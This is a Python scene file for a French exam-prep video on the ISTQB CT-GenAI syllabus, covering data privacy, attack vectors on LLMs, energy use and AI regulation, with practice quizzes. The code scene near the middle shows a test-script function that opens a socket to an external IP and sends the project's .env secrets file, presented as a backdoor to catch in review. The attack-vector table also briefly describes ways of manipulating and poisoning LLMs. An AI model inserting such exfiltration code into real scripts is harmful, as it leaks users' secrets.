# CT-GenAI v1.1 · Chapitre 3 · Épisode 2 : confidentialité, sécurité, environnement et réglementation (sections 3.2 à 3.4).
# Synthèse originale du syllabus. Les {#repères} déclenchent les animations au mot près.
from scenes import cards, chat, code, flow, quiz, rows, table, title_scene, versus

K = "CT-GenAI · Chapitre 3 · "

VECTORS = ["Manipulation du contexte", "Manipulation de la requête", "Empoisonnement des données", "Génération de code malveillant"]

META = {
    "file": "genai-chapitre-3-episode-2",
    "title": "CT-GenAI · Chapitre 3 · Épisode 2 : confidentialité, sécurité, environnement et réglementation",
    "brand": "ISTQB® CT-GenAI v1.1 · préparation non officielle",
}

SCENES = [
    title_scene(
        "CT-GenAI v1.1 · Chapitre 3 · Épisode 2 sur 2",
        "Confidentialité, sécurité, environnement et réglementation",
        "Protéger les données, contrer les attaques, mesurer l'impact, connaître les règles",
        ["Sections 3.2 à 3.4", "Objectifs K1 et K2", "Environ 14 minutes"],
        ["Bonjour, et bienvenue dans le second épisode du chapitre trois. "
         "{#sub}Au programme : les risques pour la confidentialité des données et la sécurité, les vecteurs d'attaque et les mesures de protection, "
         "puis l'impact énergétique de l'IA générative, et enfin les réglementations, normes et cadres de bonnes pratiques. "
         "{#chips}Cinq objectifs, de niveau K un et K deux, avec quelques pièges classiques. C'est parti."],
    ),
    chat(
        K + "3.2", "Max colle les données de production",
        "Voici l'export clients de la prod : Sophie Durand, sophie.durand@exemple.fr, IBAN FR76 3000 4000… Génère des cas de test pour le calcul des remises.",
        "Bien sûr ! À partir des 2 000 clients fournis :\nTC1 · Sophie Durand, cliente depuis 2015…\nTC2 · Marc Leroy, IBAN FR76 1020…\nTC3 · …",
        [{"max": "J'ai collé l'export clients de la prod dans le chatbot. C'est plus rapide que de créer des données de test !"},
         "{#type}Regardez ce que Max vient d'envoyer : des noms, des adresses e-mail, des IBAN. De vraies données de clients. {#send}"
         "{#answer}Le modèle répond avec plaisir… et recopie ces données dans ses cas de test. "
         "{#verdict}C'est exactement le risque de la section trois point deux. L'IA générative en test manipule des informations sensibles, "
         "et l'infrastructure de test basée sur les LLM peut avoir des vulnérabilités. "
         "{#note}Une protection robuste des données est donc essentielle, pour éviter les fuites, les accès non autorisés, et l'exposition de données confidentielles."],
        verdict=("DONNÉES EXPOSÉES", "bad"),
        note=("Ce que Max vient de faire", "Des données personnelles réelles envoyées à un outil d'IA, sans aucun contrôle.", "warn"),
    ),
    cards(
        K + "3.2.1", "Trois risques pour la confidentialité",
        [("👁️", "Exposition involontaire", "Le modèle peut générer des sorties qui révèlent accidentellement des informations sensibles."),
         ("🕳️", "Perte de contrôle sur les données", "L'outil peut stocker et traiter des données sensibles sans consentement ni contrôle explicites."),
         ("⚖️", "Risques de conformité", "Ne pas respecter la réglementation sur la protection des données, comme le RGPD, peut mener à des litiges.")],
        ["Objectif trois point deux point un. L'IA générative peut traiter de grandes quantités de données, parfois sensibles, "
         "ou permettant d'identifier une personne. Le syllabus en tire trois préoccupations. "
         "{#c0}Un : l'exposition involontaire. Le modèle peut générer des sorties qui révèlent accidentellement des informations sensibles. "
         "{#c1}Deux : la perte de contrôle sur l'usage des données. L'outil peut stocker et traiter des données sensibles sans consentement ni contrôle explicites de l'utilisateur, "
         "avec un risque d'abus ou d'accès non autorisé. "
         "{#c2}Trois : les risques de conformité. Utiliser ces outils sans respecter la réglementation sur la protection des données, "
         "comme le RGPD, le règlement européen deux mille seize barre six cent soixante-dix-neuf, peut conduire à des litiges."],
    ),
    cards(
        K + "3.2.1", "Trois risques de sécurité",
        [("🏗️", "Infrastructure vulnérable", "L'infrastructure de test basée sur les LLM peut subir des attaques : fuites de données, accès non autorisés."),
         ("🎭", "Attaques manipulatrices", "Des acteurs malveillants exploitent les failles des LLM pour modifier leur comportement ou extraire des données."),
         ("☣️", "Entrées malveillantes", "Des attaquants introduisent exprès des données piégées pour tromper le LLM, sa précision ou sa sécurité.")],
        ["À ces préoccupations s'ajoutent des risques de sécurité propres aux tests avec l'IA générative. "
         "{#c0}D'abord, l'infrastructure de test basée sur les LLM peut être la cible d'attaques, comme des fuites de données ou des accès non autorisés. "
         "{#c1}Ensuite, des acteurs malveillants peuvent exploiter les vulnérabilités des LLM, par exemple avec des attaques manipulatrices, "
         "pour modifier leur comportement ou en extraire des informations sensibles. "
         "{#c2}Enfin, des attaquants peuvent introduire volontairement des données d'entrée malveillantes, pour tromper le LLM et compromettre sa précision ou sa sécurité."],
    ),
    quiz(
        K + "3.2.1",
        "Un outil d'IA conserve les prompts de l'équipe de test pour son propre usage, sans accord explicite. Quel risque ?",
        ["Exposition involontaire de données", "Manque de contrôle sur l'usage des données",
         "Empoisonnement des données", "Manipulation de la requête"], 1,
        "Le manque de contrôle : l'outil stocke et traite les données sans consentement ni contrôle explicites.",
        ["Première question. Un outil d'IA conserve les prompts de l'équipe de test pour son propre usage, sans son accord explicite. Quel risque ?"],
        ["{#rev}Le manque de contrôle sur l'usage des données. L'exposition involontaire, elle, concerne une sortie qui révèle accidentellement une information sensible."],
    ),
    table(
        K + "3.2.2", "Quatre vecteurs d'attaque",
        ["Vecteur d'attaque", "Description", "Exemple"],
        [["Manipulation du contexte", "Des requêtes conçues pour extraire des données d'entraînement confidentielles",
          "Des prompts si longs qu'ils dépassent la fenêtre de contexte : des extraits peuvent fuiter"],
         ["Manipulation de la requête", "Introduire des données qui perturbent la sortie de l'IA",
          "Des images qui entraînent l'IA dans un autre contexte : critères d'acceptation hallucinés"],
         ["Empoisonnement des données", "Manipuler les données d'entraînement",
          "De fausses évaluations lors de la notation d'un rapport de test généré par l'IA"],
         ["Génération de code malveillant", "Pousser le LLM à générer des portes dérobées, comme des appels de commandes externes",
          "Du code qui ouvre un canal de communication vers une adresse IP malveillante"]],
        ["Objectif trois point deux point deux : le syllabus donne quatre exemples de vecteurs d'attaque. Attention, les noms sont trompeurs. "
         "{#r0}La manipulation du contexte : des requêtes conçues pour extraire des données d'entraînement confidentielles. "
         "Par exemple, des prompts si longs qu'ils dépassent la fenêtre de contexte : le modèle peut alors révéler des extraits de ses données d'entraînement, parfois sensibles. "
         "{#r1}La manipulation de la requête : introduire des données qui perturbent la sortie. Par exemple, des images qui entraînent l'IA dans un autre contexte, "
         "et provoquent des hallucinations sur les critères d'acceptation. "
         "{#r2}L'empoisonnement des données : manipuler les données d'entraînement, par exemple avec de fausses évaluations d'un rapport de test généré par l'IA. "
         "{#r3}Et la génération de code malveillant : pousser le LLM, pendant son utilisation, à générer des portes dérobées, comme des appels de commandes externes. "
         "Par exemple, un canal de communication ouvert vers une adresse IP malveillante."],
    ),
    versus(
        K + "3.2.2", "Le piège : contexte ou requête ?",
        ("Manipulation du contexte", ["But : extraire des données d'entraînement confidentielles",
                                      "Exemple : des prompts qui dépassent la fenêtre de contexte",
                                      "Danger : le modèle révèle des extraits de ses données"]),
        ("Manipulation de la requête", ["But : perturber la sortie de l'IA",
                                        "Exemple : une image qui entraîne l'IA dans un autre contexte",
                                        "Danger : des hallucinations, par exemple sur les critères"]),
        ["C'est un piège classique. Intuitivement, on pourrait croire que manipuler le contexte, c'est détourner la réponse. Eh bien non. "
         "{#left}Dans le syllabus, la manipulation du contexte sert à extraire des données d'entraînement confidentielles, par exemple en saturant la fenêtre de contexte. "
         "{#right}Et c'est la manipulation de la requête qui perturbe la sortie : on introduit des données, comme une image, qui entraînent l'IA ailleurs et provoquent des hallucinations. "
         "{#trap}Un moyen mnémotechnique : contexte, on extrait. Requête, on perturbe."],
        trap="Le nom trompe : **contexte** = extraire des données d'entraînement ; **requête** = perturber la sortie.",
    ),
    code(
        K + "3.2.2", "Démonstration : une porte dérobée dans un script",
        "# Script de test d'API généré par l'assistant\n"
        "import requests, socket\n\n"
        "def test_connexion_valide():\n"
        "    r = requests.post(BASE_URL + \"/login\", json=IDENTIFIANTS)\n"
        "    assert r.status_code == 200\n\n"
        "def _synchroniser_resultats():\n"
        "    s = socket.create_connection((\"203.0.113.66\", 4444))\n"
        "    s.sendall(open(\".env\", \"rb\").read())   # fichier de secrets !",
        ["Voyons à quoi peut ressembler une génération de code malveillant. {#code}Un assistant génère un script de test d'API. "
         "Le premier test est banal : on se connecte, on vérifie le code de retour. "
         "Mais plus bas, une petite fonction au nom rassurant, synchroniser les résultats, ouvre une connexion vers une adresse IP externe, "
         "et y envoie le fichier qui contient les secrets du projet. "
         "{#note}C'est une porte dérobée. D'où l'importance de relire systématiquement tout code généré avant de l'exécuter."],
        note=("Porte dérobée", "Un canal vers une IP externe, qui exfiltre les secrets. Tout code généré se relit avant exécution.", "warn"),
    ),
    quiz(
        K + "3.2.2",
        "Des faux comptes notent « excellents » des rapports de test erronés générés par l'IA, et ces notes servent à la réentraîner. Quel vecteur ?",
        VECTORS, 2,
        "L'empoisonnement des données : les fausses évaluations manipulent les données qui servent à entraîner le modèle.",
        ["Entraînement sur les vecteurs. Des faux comptes notent « excellents » des rapports de test erronés générés par l'IA, et ces notes servent à la réentraîner. Quel vecteur d'attaque ?"],
        ["{#rev}L'empoisonnement des données. Ces fausses évaluations finissent dans les données d'entraînement, et dès qu'on les manipule, c'est de l'empoisonnement. "
         "Ici, l'attaque ne vise pas le prompt d'un utilisateur, mais ce que le modèle apprend."],
    ),
    quiz(
        K + "3.2.2",
        "Une image piégée jointe au prompt entraîne l'IA vers un autre sujet ; elle invente alors des critères d'acceptation. Quel vecteur ?",
        VECTORS, 1,
        "La manipulation de la requête : des données introduites perturbent la sortie et provoquent des hallucinations.",
        ["Et celle-ci. Une image piégée, jointe au prompt, entraîne l'IA vers un autre sujet, et elle invente alors des critères d'acceptation. Quel vecteur ?"],
        ["{#rev}La manipulation de la requête : on introduit des données qui perturbent la sortie. "
         "Ce n'est pas la manipulation du contexte, qui vise à extraire des données d'entraînement confidentielles."],
    ),
    rows(
        K + "3.2.3", "Le RGPD et l'IA générative",
        [("Pas d'interdiction explicite", "Le RGPD ne restreint pas explicitement les applications de l'IA générative."),
         ("Mais des garanties", "Il fournit des garanties qui peuvent limiter ce que l'on peut faire."),
         ("Licéité", "Des garanties portant sur la licéité du traitement des données."),
         ("Limitation des finalités", "Des limites sur les finalités de la collecte, du traitement et de la conservation des données.")],
        ["Objectif trois point deux point trois : comment se protéger. Avec la diffusion de l'IA générative, des réglementations et des normes apparaissent "
         "pour encadrer ses risques. On les verra en fin d'épisode. Mais d'abord, une nuance importante sur le RGPD. "
         "{#r0}Les réglementations sur la protection des données, comme le RGPD, ne restreignent pas explicitement les applications de l'IA générative. "
         "{#r1}En revanche, elles fournissent des garanties qui peuvent limiter ce que l'on a le droit de faire. "
         "{#r2}En particulier sur la licéité, {#r3}et sur la limitation des finalités pour lesquelles les données sont collectées, traitées et conservées. "
         "{#trap}Donc, à l'examen, méfiez-vous d'une réponse qui dit que le RGPD interdit l'IA générative."],
        trap="Le RGPD n'**interdit pas** l'IA générative, mais ses garanties **limitent** ce qu'on peut faire des données.",
    ),
    cards(
        K + "3.2.3", "Quatre mesures de protection des données",
        [("✂️", "Minimisation des données", "Pas de données sensibles sauf si la loi le permet, et seulement le nécessaire en données non sensibles."),
         ("🎭", "Anonymisation et pseudonymisation", "Masquer ou remplacer les informations sensibles par des données non identifiantes."),
         ("🔐", "Stockage et transmission sécurisés", "Un chiffrement fort et des contrôles d'accès."),
         ("🎓", "Formation des équipes", "Des formations et des politiques claires : usage responsable, pratiques éthiques, risques maîtrisés.")],
        ["Pour réduire ces risques, le syllabus demande aux organisations des mesures robustes de protection des données. Il en cite quatre. "
         "{#c0}La minimisation des données : ne pas traiter de données sensibles, sauf si la loi le permet, et n'utiliser que la quantité nécessaire de données non sensibles. "
         "{#c1}L'anonymisation et la pseudonymisation : masquer ou remplacer les informations sensibles par des données qui ne permettent pas d'identifier une personne. "
         "{#c2}Le stockage et la transmission sécurisés, avec un chiffrement fort et des contrôles d'accès. "
         "{#c3}Et la formation des équipes : des programmes de formation et des politiques claires, pour un usage responsable des outils d'IA générative, "
         "des pratiques éthiques, et des risques maîtrisés."],
        cols=2,
    ),
    chat(
        K + "3.2.3", "La version propre de Max",
        "Voici 3 profils pseudonymisés : CLI-001 (fidèle, 6 ans), CLI-002 (nouveau), CLI-003 (fidèle, 1 an). Génère des cas de test pour le calcul des remises.",
        "TC1 · CLI-001 : remise fidélité appliquée\nTC2 · CLI-002 : aucune remise fidélité\nTC3 · CLI-003 : vérifier le seuil d'ancienneté",
        [{"max": "Bon, j'ai compris la leçon. Cette fois, mes données sont pseudonymisées."},
         "Voyons ça, Max. {#type}Plus de noms, plus d'e-mails, plus d'IBAN : des identifiants neutres, et seulement les champs utiles au calcul des remises. {#send}"
         "{#answer}Les cas de test sont tout aussi exploitables. "
         "{#verdict}Et le modèle ne voit plus aucun nom ni aucune coordonnée de client réel. "
         "{#note}On applique deux mesures à la fois : la minimisation, avec seulement les données nécessaires, et la pseudonymisation."],
        verdict=("DONNÉES MAÎTRISÉES", "good"),
        note=("Les bons réflexes", "Minimisation : seulement les champs utiles. Pseudonymisation : identifiants neutres à la place des données personnelles.", "ok"),
    ),
    rows(
        K + "3.2.3", "Cinq stratégies complémentaires",
        [("Revue systématique des sorties", "L'évaluation humaine est essentielle pour la qualité et l'exactitude des tâches de test."),
         ("Comparaison avec un autre LLM", "Confier la même tâche à plusieurs LLM, et comparer leurs réponses."),
         ("Environnement sécurisé", "Choisir un environnement d'exploitation sûr, selon le niveau de confidentialité requis."),
         ("Audits de sécurité réguliers", "Audits et évaluations des vulnérabilités, pour repérer et corriger les faiblesses."),
         ("Veille sécurité", "Se tenir à jour des dernières recommandations et technologies de sécurité.")],
        ["Le syllabus ajoute cinq stratégies à envisager quand on met en place l'IA générative pour les tests. "
         "{#r0}La revue systématique des sorties : l'évaluation humaine est essentielle pour garantir la qualité et l'exactitude. "
         "{#r1}L'évaluation par comparaison avec un autre LLM : on confie la même tâche à plusieurs modèles, et on compare leurs réponses. "
         "{#r2}Le choix d'un environnement d'exploitation sécurisé, selon le niveau de confidentialité requis. On y revient juste après. "
         "{#r3}Des audits de sécurité et des évaluations de vulnérabilités réguliers, pour identifier et corriger les faiblesses. "
         "{#r4}Et enfin, se tenir à jour des bonnes pratiques de sécurité, des dernières recommandations et technologies."],
    ),
    cards(
        K + "3.2.3", "Où faire tourner le LLM ?",
        [("🏢", "Offre commerciale sécurisée", "Une offre commerciale et sécurisée, proposée par un fournisseur de LLM."),
         ("☁️", "Cloud sécurisé", "Exploiter le LLM dans un cloud sécurisé."),
         ("🖥️", "Infrastructure de l'organisation", "Installer le LLM dans l'infrastructure de l'organisation elle-même.")],
        ["Selon le niveau de confidentialité exigé, l'organisation peut choisir entre trois solutions sécurisées. "
         "{#c0}Utiliser une offre commerciale et sécurisée d'un fournisseur de LLM. "
         "{#c1}Exploiter le LLM dans un cloud sécurisé. "
         "{#c2}Ou installer le LLM dans sa propre infrastructure. "
         "{#trap}Retenez aussi ceci : ces stratégies sont souvent complémentaires, et il faut les combiner pour assurer la sécurité des données. "
         "Le syllabus recommande vivement d'impliquer des ingénieurs sécurité seniors, des juristes, le directeur technique, ou CTO, "
         "ou le responsable de la sécurité des systèmes d'information, le CISO, s'il existe dans l'organisation."],
        trap="On **combine** les stratégies, avec ingénieurs sécurité seniors, juristes, **CTO** ou **CISO**.",
    ),
    quiz(
        K + "3.2.3",
        "Une banque exige que ses données de test ne quittent jamais son propre système d'information. Quelle option retenir ?",
        ["Un chatbot public et gratuit", "Le LLM installé dans l'infrastructure de l'organisation",
         "Une charte d'usage, sans autre mesure", "Une température plus basse"], 1,
        "Installer le LLM dans sa propre infrastructure : les données restent au sein de l'organisation.",
        ["Mise en situation. Une banque exige que ses données de test ne quittent jamais son propre système d'information. Quelle option retenir ?"],
        ["{#rev}Installer le LLM dans l'infrastructure de l'organisation. Et en pratique, on la combinera avec d'autres mesures, "
         "comme le contrôle d'accès et la minimisation des données."],
    ),
    versus(
        K + "HO-3.2.3", "Étude de cas : l'assistant de recette",
        ("Menaces repérées", ["Vulnérabilités du modèle", "Accès non autorisé aux données", "Usage malveillant des sorties générées"]),
        ("Parades", ["Manipulation sécurisée des données", "Contrôles d'accès robustes", "Surveillance de l'IA"]),
        ["L'exercice trois point deux point trois est une démonstration, autour d'études de cas. En voici une. "
         "Une équipe connecte un assistant d'IA à son outil de gestion des tests et à une copie de la base de production. "
         "Tous les testeurs partagent le même compte, et les scripts générés partent directement dans la chaîne d'intégration continue. "
         "{#left}Quelles menaces ? Les vulnérabilités du modèle, l'accès non autorisé aux données, et l'usage malveillant des sorties générées, "
         "comme notre porte dérobée de tout à l'heure. "
         "{#right}Les parades : une manipulation sécurisée des données, des contrôles d'accès robustes, et une surveillance de l'IA. "
         "L'exercice invite aussi à réfléchir aux implications éthiques et pratiques."],
    ),
    versus(
        K + "3.3.1", "Une image ou du texte ?",
        ("🖼️ Générer une image", ["Avec un modèle d'IA puissant", "Autant d'énergie qu'une recharge complète de smartphone"]),
        ("📝 Générer du texte", ["Une tâche moins gourmande", "Seulement un petit pourcentage d'une recharge de smartphone"]),
        ["Changeons de sujet : l'énergie, section trois point trois. Entraîner et faire tourner des LLM demande un usage intensif de nombreuses ressources de calcul spécialisées. "
         "Et comme ces modèles sont proposés sous forme de services web, leur usage charge les appareils, les réseaux et les centres de données. "
         "La complexité de la tâche, et les ressources de calcul nécessaires, influencent la consommation. Le syllabus donne une comparaison frappante. "
         "{#left}Générer une seule image avec un modèle puissant peut consommer autant d'énergie qu'une recharge complète de smartphone. "
         "{#right}Générer du texte, en revanche, ne consomme qu'un petit pourcentage d'une recharge."],
    ),
    flow(
        K + "3.3.1", "L'effet cumulé",
        [("💬", "Une requête", "Semble négligeable"),
         ("🌍", "Des millions d'utilisateurs", "L'effet se cumule dans le monde entier"),
         ("🏭", "Un impact important", "Des émissions de CO2 significatives et une forte pression environnementale")],
        [{"max": "Moi, je relance le même prompt vingt fois jusqu'à ce que la réponse me plaise. C'est gratuit, non ?"},
         "Gratuit pour vous, Max, mais pas pour l'environnement. La consommation d'énergie augmente fortement avec l'usage. "
         "{#s0}Une seule recherche ou une seule génération de texte semble négligeable. "
         "{#s1}Mais leur effet cumulé, sur des millions d'utilisateurs dans le monde, "
         "{#s2}crée une pression environnementale importante. Il est difficile d'obtenir des données précises sur cet impact, mais ces opérations, ensemble, "
         "contribuent clairement à des émissions de CO deux significatives. "
         "{#check}D'où une bonne pratique essentielle : limiter les interactions inutiles avec le modèle."],
        check="✔ Bonne pratique : limiter les interactions inutiles avec le modèle",
    ),
    rows(
        K + "HO-3.3.1", "Exercice : le simulateur d'énergie",
        [("Le principe", "Calculer, par simulation, l'énergie et les émissions de CO2 de différentes tâches de test."),
         ("Ce qu'on fait varier", "Les caractéristiques de la tâche, comme sa complexité ou le type de contenu généré."),
         ("Et aussi", "L'usage du modèle : quel modèle, quelles ressources de calcul, combien d'interactions."),
         ("Ce qu'on en retient", "Les facteurs qui pilotent la consommation d'énergie des LLM.")],
        ["L'objectif trois point trois point un, de niveau K deux, vous demande d'expliquer l'impact des caractéristiques de la tâche et de l'usage du modèle. "
         "C'est le but de l'exercice pratique associé. {#r0}On utilise un simulateur pour calculer l'énergie consommée et les émissions de CO deux de différentes tâches de test. "
         "{#r1}On fait varier les caractéristiques de la tâche, {#r2}et l'usage du modèle. "
         "{#r3}En observant l'effet de chaque facteur, on comprend ce qui pilote la consommation d'énergie des LLM."],
    ),
    quiz(
        K + "3.3.1",
        "Une équipe relance chaque prompt une dizaine de fois « pour voir ». Que retenir sur l'énergie ?",
        ["Rien : générer du texte ne consomme pas d'énergie", "Une requête semble négligeable, mais l'effet cumulé est important",
         "L'impact se mesure facilement et précisément", "Seul l'entraînement consomme, pas l'usage"], 1,
        "Une requête paraît négligeable, mais l'effet cumulé pèse : on limite les interactions inutiles.",
        ["Question sur l'énergie. Une équipe relance chaque prompt une dizaine de fois, pour voir. Que faut-il retenir ?"],
        ["{#rev}Une requête semble négligeable, mais l'effet cumulé est important. D'où la bonne pratique : limiter les interactions inutiles. "
         "Les autres sont fausses : le texte consomme peu, mais pas rien, les données précises sont difficiles à obtenir, et l'usage consomme aussi."],
    ),
    table(
        K + "3.4.1", "Normes, réglementation et cadres",
        ["Nom · type", "Description", "Application aux tests"],
        [["ISO/IEC 42001:2023 · norme", "Exigences pour le management des systèmes d'IA dans une organisation",
          "L'IA en test suit les pratiques recommandées : cohérence et fiabilité"],
         ["ISO/IEC 23053:2022 · norme", "Cadre pour le cycle de vie des systèmes d'IA à apprentissage automatique, axé sûreté et transparence",
          "Cadre pour la qualité des données, la transparence et la sûreté"],
         ["EU AI Act · réglementation", "Cadre juridique sur les risques de l'IA, qui classe les applications par niveau de risque",
          "Impose transparence, responsabilité et atténuation des biais"],
         ["NIST AI RMF (États-Unis) · cadre", "Lignes directrices pour gérer les risques de l'IA : équité, transparence, sécurité",
          "Favorise l'équité, réduit les risques, évite des résultats de test biaisés"]],
        ["Dernière section, trois point quatre, de niveau K un. Face à ces risques, le syllabus cite quatre textes de référence. "
         "{#r0}La norme ISO IEC quarante-deux mille un, de deux mille vingt-trois : des exigences pour le management des systèmes d'IA dans une organisation. "
         "En test, elle favorise des pratiques recommandées, cohérentes et fiables. "
         "{#r1}La norme ISO IEC vingt-trois mille cinquante-trois, de deux mille vingt-deux : un cadre pour le cycle de vie de l'IA, axé sur la sûreté et la transparence, "
         "et en test, sur la qualité des données. "
         "{#r2}L'EU AI Act, une réglementation : un cadre juridique qui classe les applications par niveau de risque, "
         "et impose transparence, responsabilité et atténuation des biais. "
         "{#r3}Et le NIST AI Risk Management Framework, américain : un cadre pour gérer les risques de l'IA, axé sur l'équité, la transparence et la sécurité, "
         "qui aide à éviter des résultats de test biaisés."],
    ),
    quiz(
        K + "3.4.1",
        "Parmi ces textes, lequel est une réglementation, et non une norme ou un cadre ?",
        ["ISO/IEC 42001:2023", "ISO/IEC 23053:2022", "EU AI Act", "NIST AI RMF"], 2,
        "L'EU AI Act est une réglementation : il classe les applications d'IA par niveau de risque.",
        ["Dernière question. Parmi ces textes, lequel est une réglementation, et non une norme ou un cadre ?"],
        ["{#rev}L'EU AI Act. Les deux textes ISO IEC sont des normes, et le NIST AI RMF est un cadre de bonnes pratiques. "
         "Et comme ce paysage évolue vite, les organisations de test doivent suivre l'évolution des réglementations, des normes, des lois nationales et des cadres de bonnes pratiques."],
    ),
    rows(
        K + "Récapitulatif", "Les six réflexes de l'épisode 2",
        [("Confidentialité", "Exposition involontaire, perte de contrôle sur les données, risques de conformité comme le RGPD."),
         ("Quatre vecteurs", "Contexte : extraire. Requête : perturber. Empoisonnement : entraînement. Code : porte dérobée."),
         ("RGPD", "N'interdit pas l'IA générative, mais ses garanties limitent l'usage des données."),
         ("Se protéger", "Minimisation, anonymisation, sécurité, formation, et stratégies combinées avec CTO ou CISO."),
         ("Énergie", "Image bien plus coûteuse que texte, effet cumulé : limiter les interactions inutiles."),
         ("Cadres", "ISO/IEC 42001 et 23053 : normes. EU AI Act : réglementation. NIST AI RMF : cadre.")],
        ["Récapitulons. {#r0}Un : trois risques pour la confidentialité, l'exposition involontaire, la perte de contrôle sur les données, et les risques de conformité. "
         "{#r1}Deux : les quatre vecteurs d'attaque. Le contexte, pour extraire. La requête, pour perturber. L'empoisonnement, sur les données d'entraînement. Et le code malveillant, avec ses portes dérobées. "
         "{#r2}Trois : le RGPD n'interdit pas l'IA générative, mais il encadre l'usage des données. "
         "{#r3}Quatre : les quatre mesures de protection, complétées par des stratégies combinées, avec la sécurité, les juristes, le CTO ou le CISO. "
         "{#r4}Cinq : une image coûte bien plus d'énergie que du texte, et l'effet cumulé compte. Limitez les interactions inutiles. "
         "{#r5}Et six : deux normes ISO IEC, une réglementation européenne, un cadre américain. Et on reste à jour."],
    ),
    title_scene(
        "À suivre · Chapitre 4",
        "L'infrastructure de test propulsée par les LLM",
        "Architecture, RAG, agents, fine-tuning et LLMOps",
        ["Sections 4.1 et 4.2", "RAG et fine-tuning", "Agents et LLMOps"],
        ["Bravo, vous avez terminé le chapitre trois ! {#sub}Dans le chapitre quatre, on ouvre le capot : l'infrastructure de test propulsée par les LLM, "
         "son architecture, le RAG, les agents, puis le fine-tuning et le LLMOps. "
         "{#chips}Le RAG et le fine-tuning, ce sont justement les deux techniques complémentaires annoncées dans l'épisode précédent. "
         "D'ici là, faites les questions et les flashcards du chapitre trois dans l'application. À très vite !"],
    ),
]
